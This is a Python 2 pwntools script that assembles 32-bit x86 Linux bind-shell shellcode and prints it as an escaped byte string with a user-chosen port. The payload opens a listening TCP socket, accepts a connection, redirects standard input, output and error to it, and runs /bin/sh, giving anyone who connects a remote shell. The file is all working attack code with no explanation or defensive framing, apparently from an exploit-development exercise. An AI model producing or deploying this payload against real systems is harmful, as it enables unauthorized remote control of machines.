#!/usr/bin/env python
from pwn import *

sh = asm("""
    mov   ebp, esp
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx
    push  eax
    push  eax 
    push  eax 
    pushw  0x5c11 
    pushw  0x02   
    mov   ax, 0x167   
    mov   bl, 0x02
    mov   cl, 0x01
    int   0x80
    mov   edi, eax
    xor   eax, eax
    mov   ax, 0x169   
    mov   ebx, edi
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp
    int   0x80
    xor   eax, eax
    mov   ax, 0x16b
    mov   ebx, edi
    xor   ecx, ecx
    int   0x80
    xor   eax, eax
    mov   ax, 0x16c
    mov   ebx, edi
    xor   ecx, ecx
    xor   edx, edx
    xor   esi, esi
    int   0x80
    mov   esi, eax
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    mov   ebx, esi
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup
    xor   eax, eax
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp
    mov   al, 0x0b
    int   0x80
""")

def sh2str(sh):
    payload = ''
    for i in range(len(sh)):
        c = str(hex(ord(sh[i])))[2:]
        if len(c) == 1:
            c = '\\x0' + c
        else:
            c = '\\x' + c

        payload += c

    return payload

shellcode = sh2str(sh)

if len(sys.argv) < 2:
    print 'Usage: ./bind_tcp.py <port_to_bind>'
    exit(1)

port = hex(socket.htons(int(sys.argv[1])))
sc = shellcode.replace("\\x11\\x5c","\\x{b1}\\x{b2}".format(b1 = port[4:6],b2 = port[2:4])) # change port 


print sc








